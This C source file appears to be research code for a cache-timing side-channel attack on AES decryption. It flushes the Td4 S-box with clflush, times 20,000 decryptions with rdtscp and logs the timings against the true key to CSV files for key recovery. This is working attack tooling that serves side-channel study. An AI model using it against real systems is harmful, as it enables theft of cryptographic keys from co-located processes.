/*
 * Copyright 2024 Zhiyuan Zhang
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include "../aes_source/attack.h"
#include <time.h>
#include <sys/mman.h>

#include <mastik/low.h>
#include <mastik/util.h>

extern u8 Td4[256];
#define SAMPLES 20000
#define REPEAT 1
#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence;\n");

int flush_array[256 * 1024] = {0};
void init_array(int *buffer);
void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index);
uint32_t time_collection[SAMPLES] = {0};

int main(int argc, char* argv[])
{
  srand(1);
  int random_times = atoi(argv[1]);
  aes_t key,out, tmp, guess_key, real_key;
  init_array(flush_array);
  
  // Set Key
  //toBinary("00112233445566778899aabbccddeeff", key);
  for (int i = 0; i < random_times; i++)
    randAes(key);
  AES_set_decrypt_key(key, 128, &aeskey);

  const u32 *rk;
  rk = aeskey.rd_key;
  printf("Key: ");
  for (int copy_key = 0; copy_key < 16; copy_key++) {
    real_key[copy_key] = (rk[copy_key/4] >> ((copy_key % 4) * 8)) & 0xff;
    printf("%x ", (real_key[copy_key] & 0xFF) >> 6);
  }
  printf("\n");

  // Store benchmarking results to this file
  FILE *f1 = fopen("key_round1.csv", "w");
  fprintf(f1, "key\n");
  fprintf(f1, "%s\n", toString(real_key));
  fclose(f1);

  //Randomly Generate CT
  aes_t in[SAMPLES];
  for (int i = 0; i < SAMPLES; i++) {
    randAes(in[i]);
  }

  // Warmup
  for (int rr = 0; rr < 100; rr++)
    delayloop(0x800000);

  for (int s = 0; s < SAMPLES; s++) {
    int index = random() % 256;
    uint64_t overall_time = 0;
    for (int rr = 0; rr < REPEAT; rr++) {
      // Cache second entry
      for (int i = 0; i < 256; i++)
        *(volatile int*)&flush_array[i << 10];

      // Slow down the pointer chasing
      clflush(&flush_array[index << 10]);
      memory_barrier

      // Cache other table entries
      *(volatile uint8_t*)&Td4[64];
      *(volatile uint8_t*)&Td4[128];
      *(volatile uint8_t*)&Td4[192];
      memory_barrier
      memory_barrier
      memory_barrier

      // Evict Sbox
      clflush(&Td4[0]);
      memory_barrier

      // Start Measurement
      uint32_t time_start = rdtscp();
      victim_function(in[s], out, aeskey, index);
      uint32_t time_end = rdtscp();
      overall_time += (time_end - time_start);
    }

    time_collection[s] = overall_time / REPEAT;
  }

  FILE *f = fopen("data_round1.csv", "w");
  fprintf(f, "ciphertext time access\n");
  for (int i = 0; i < SAMPLES; i++) {
    fprintf(f, "%s %d %d\n", toString(in[i]), time_collection[i], AES_decrypt2(in[i], out, &aeskey,0));
  }
  fclose(f);
}

void init_array(int *buffer)
{
    for (size_t k = 0; k < 256; ++k)
    {                                                                  
        size_t x = ((k * 167) + 13) & (0xff);
        buffer[k * 1024] = x;
    }
}

void victim_function(aes_t in, aes_t out, AES_KEY aeskey, int index)
{
  memory_barrier
  volatile int next_index = flush_array[index << 10];
asm volatile (".rept 0;\nNOP;\n.endr");
  next_index = flush_array[next_index << 10];
asm volatile (".rept 0;\nNOP;\n.endr");
  AES_decrypt(in, out, &aeskey);
  memory_barrier
}
